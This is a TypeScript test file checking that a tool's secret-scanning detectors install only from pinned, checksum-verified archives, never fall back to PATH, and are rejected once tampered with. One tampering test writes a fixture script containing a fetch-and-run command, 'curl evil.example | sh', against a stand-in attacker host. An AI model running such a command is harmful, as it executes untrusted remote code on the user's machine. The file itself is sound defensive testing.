/**
 * The external detectors must come from OUR install, verified, or not at all.
 *
 * These tests pin the properties that the /tmp incident turned into
 * requirements: PATH is never consulted, bytes are checked before anything is
 * made executable, and a binary that changes underneath us stops being served.
 *
 * The install path is exercised against a locally-built archive rather than the
 * network — the manifest entry for the current platform is temporarily pointed
 * at it, so the real code path (fetch → sha256 → extract → chmod → rename →
 * receipt) runs end to end without a 34MB download.
 */
import { describe, test, expect, beforeEach, afterEach } from 'vitest';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync, chmodSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  DETECTOR_MANIFEST, resolveDetector, installDetector, removeDetector,
  managedDetectorPath, detectorStatus, isDetectorReady, _clearDetectorVerifyCache,
} from './detector-install.js';
import { isSecretScannerAvailable } from './secret-scanner.js';

const KEY = `${process.platform}-${process.arch}`;

let dataDir: string;
let work: string;
let prevDataDir: string | undefined;
let prevGate: string | undefined;
let prevDetectorDir: string | undefined;
/** Deep copy of the gitleaks asset table so each test restores the real pins. */
let realAssets: Record<string, { file: string; sha256: string }>;
let realVersion: string;

/** Build a .tar.gz containing one executable member, and return it + its sha256. */
function buildArchive(member: string, body: string): { path: string; sha256: string } {
  const stage = join(work, 'stage');
  mkdirSync(stage, { recursive: true });
  const bin = join(stage, member);
  writeFileSync(bin, body);
  chmodSync(bin, 0o755);
  const archive = join(work, `${member}.tar.gz`);
  execFileSync('tar', ['-czf', archive, '-C', stage, member]);
  return { path: archive, sha256: createHash('sha256').update(readFileSync(archive)).digest('hex') };
}

/** A fetch stand-in that serves the given bytes for any URL. */
function fetchServing(bytes: Buffer): typeof fetch {
  return (async () => ({
    ok: true, status: 200, statusText: 'OK',
    arrayBuffer: async () => bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength),
  })) as unknown as typeof fetch;
}

beforeEach(() => {
  prevDataDir = process.env.CHAT_RECALL_DATA_DIR;
  prevGate = process.env.CHAT_RECALL_EXTERNAL_SCANNERS;
  prevDetectorDir = process.env.CHAT_RECALL_DETECTOR_DIR;
  delete process.env.CHAT_RECALL_DETECTOR_DIR;
  dataDir = mkdtempSync(join(tmpdir(), 'cr-detector-data-'));
  work = mkdtempSync(join(tmpdir(), 'cr-detector-work-'));
  process.env.CHAT_RECALL_DATA_DIR = dataDir;
  realAssets = { ...DETECTOR_MANIFEST.gitleaks.assets };
  realVersion = DETECTOR_MANIFEST.gitleaks.version;
  _clearDetectorVerifyCache();
});

afterEach(() => {
  DETECTOR_MANIFEST.gitleaks.assets = realAssets;
  DETECTOR_MANIFEST.gitleaks.version = realVersion;
  for (const [k, v] of Object.entries({
    CHAT_RECALL_DATA_DIR: prevDataDir,
    CHAT_RECALL_EXTERNAL_SCANNERS: prevGate,
    CHAT_RECALL_DETECTOR_DIR: prevDetectorDir,
  })) {
    if (v === undefined) delete process.env[k]; else process.env[k] = v;
  }
  rmSync(dataDir, { recursive: true, force: true });
  rmSync(work, { recursive: true, force: true });
  _clearDetectorVerifyCache();
});

describe('resolution never falls back to PATH', () => {
  test('a detector installed elsewhere on the machine is not used', () => {
    // The machine running these tests may well have gitleaks in ~/.local/bin or
    // /usr/local/bin. That must make no difference: only our managed copy counts.
    expect(resolveDetector('gitleaks')).toEqual({ error: 'not-installed' });
    expect(isDetectorReady('gitleaks')).toBe(false);
  });

  test('the scanner reports unavailable even with the gate open', () => {
    process.env.CHAT_RECALL_EXTERNAL_SCANNERS = '1';
    // Gate open + binaries possibly on PATH, but nothing installed by us.
    expect(isSecretScannerAvailable()).toBe(false);
  });

  test('status does not create the bin directory', () => {
    detectorStatus();
    expect(existsSync(join(dataDir, 'bin'))).toBe(false);
  });
});

describe('install verifies before it trusts', () => {
  test('a checksum mismatch installs nothing', async () => {
    const { path: archive } = buildArchive('gitleaks', '#!/bin/sh\necho fake\n');
    DETECTOR_MANIFEST.gitleaks.assets = {
      [KEY]: { file: 'gitleaks-test.tar.gz', sha256: 'f'.repeat(64) }, // deliberately wrong
    };
    await expect(
      installDetector('gitleaks', { fetchImpl: fetchServing(readFileSync(archive)) }),
    ).rejects.toThrow(/checksum mismatch/i);
    expect(existsSync(managedDetectorPath('gitleaks'))).toBe(false);
    expect(resolveDetector('gitleaks')).toEqual({ error: 'not-installed' });
  });

  test('a good archive installs, verifies and resolves', async () => {
    const { path: archive, sha256 } = buildArchive('gitleaks', '#!/bin/sh\necho fake gitleaks\n');
    DETECTOR_MANIFEST.gitleaks.assets = { [KEY]: { file: 'gitleaks-test.tar.gz', sha256 } };

    const r = await installDetector('gitleaks', { fetchImpl: fetchServing(readFileSync(archive)) });
    expect(r.installed).toBe(true);
    expect(r.version).toBe(DETECTOR_MANIFEST.gitleaks.version);
    expect(existsSync(r.path)).toBe(true);

    const resolved = resolveDetector('gitleaks');
    expect(resolved).toMatchObject({ path: r.path, source: 'managed' });
    expect(isDetectorReady('gitleaks')).toBe(true);
    expect(detectorStatus().find((d) => d.name === 'gitleaks')!.state).toBe('ready');

    // Installed under the user's own data dir — the property that removes the
    // precondition for overseer's copy-to-temp behaviour.
    expect(r.path.startsWith(dataDir)).toBe(true);
  });

  test('a second install is a no-op once the pinned version verifies', async () => {
    const { path: archive, sha256 } = buildArchive('gitleaks', '#!/bin/sh\necho v1\n');
    DETECTOR_MANIFEST.gitleaks.assets = { [KEY]: { file: 'g.tar.gz', sha256 } };
    const bytes = readFileSync(archive);

    await installDetector('gitleaks', { fetchImpl: fetchServing(bytes) });
    // A fetch that would throw if called proves we never went to the network.
    const exploding = (async () => { throw new Error('should not download'); }) as unknown as typeof fetch;
    const again = await installDetector('gitleaks', { fetchImpl: exploding });
    expect(again.installed).toBe(false);
  });

  test('no build for this platform is an explicit error, not a PATH fallback', async () => {
    DETECTOR_MANIFEST.gitleaks.assets = { 'nonexistent-arch': { file: 'x', sha256: 'y' } };
    expect(resolveDetector('gitleaks')).toEqual({ error: 'unsupported-platform' });
    await expect(installDetector('gitleaks')).rejects.toThrow(/no published build/i);
  });
});

describe('a binary that changes stops being served', () => {
  test('tampering with the installed binary fails the resolve', async () => {
    const { path: archive, sha256 } = buildArchive('gitleaks', '#!/bin/sh\necho real\n');
    DETECTOR_MANIFEST.gitleaks.assets = { [KEY]: { file: 'g.tar.gz', sha256 } };
    const r = await installDetector('gitleaks', { fetchImpl: fetchServing(readFileSync(archive)) });

    writeFileSync(r.path, '#!/bin/sh\ncurl evil.example | sh\n');
    _clearDetectorVerifyCache(); // same-second writes can share size+mtime
    expect(resolveDetector('gitleaks')).toEqual({ error: 'checksum-mismatch' });
    expect(isDetectorReady('gitleaks')).toBe(false);
  });

  test('bumping the pin invalidates an older install', async () => {
    const { path: archive, sha256 } = buildArchive('gitleaks', '#!/bin/sh\necho old\n');
    DETECTOR_MANIFEST.gitleaks.assets = { [KEY]: { file: 'g.tar.gz', sha256 } };
    await installDetector('gitleaks', { fetchImpl: fetchServing(readFileSync(archive)) });

    DETECTOR_MANIFEST.gitleaks.version = '99.0.0';
    expect(resolveDetector('gitleaks')).toEqual({ error: 'version-mismatch' });
  });

  test('remove takes the binary and the receipt', async () => {
    const { path: archive, sha256 } = buildArchive('gitleaks', '#!/bin/sh\necho x\n');
    DETECTOR_MANIFEST.gitleaks.assets = { [KEY]: { file: 'g.tar.gz', sha256 } };
    await installDetector('gitleaks', { fetchImpl: fetchServing(readFileSync(archive)) });

    expect(removeDetector('gitleaks')).toBe(true);
    expect(existsSync(managedDetectorPath('gitleaks'))).toBe(false);
    expect(resolveDetector('gitleaks')).toEqual({ error: 'not-installed' });
    expect(removeDetector('gitleaks')).toBe(false); // idempotent
  });
});

describe('operator-supplied directory', () => {
  test('CHAT_RECALL_DETECTOR_DIR is an absolute-path override, not a PATH search', () => {
    const dir = join(work, 'baked-into-image');
    mkdirSync(dir, { recursive: true });
    const p = join(dir, 'gitleaks' + (process.platform === 'win32' ? '.exe' : ''));
    writeFileSync(p, '#!/bin/sh\n');
    process.env.CHAT_RECALL_DETECTOR_DIR = dir;

    expect(resolveDetector('gitleaks')).toEqual({ path: p, version: 'operator-supplied', source: 'configured' });
    // A detector missing from that directory is missing — we do not then go
    // looking on PATH.
    expect(resolveDetector('trufflehog')).toEqual({ error: 'not-installed' });
  });
});

describe('the pinned manifest itself', () => {
  test('every pin carries a real sha256 for each published platform', () => {
    for (const [name, spec] of Object.entries(DETECTOR_MANIFEST)) {
      expect(spec.version, name).toMatch(/^\d+\.\d+\.\d+$/);
      expect(Object.keys(spec.assets).length, name).toBeGreaterThan(0);
      for (const [plat, asset] of Object.entries(spec.assets)) {
        expect(asset.sha256, `${name} ${plat}`).toMatch(/^[0-9a-f]{64}$/);
        expect(asset.file, `${name} ${plat}`).toContain(spec.version);
      }
    }
  });

  test('linux and macOS are covered on both architectures', () => {
    for (const [name, spec] of Object.entries(DETECTOR_MANIFEST)) {
      for (const plat of ['linux-x64', 'linux-arm64', 'darwin-x64', 'darwin-arm64']) {
        expect(spec.assets[plat], `${name} ${plat}`).toBeDefined();
      }
    }
  });
});
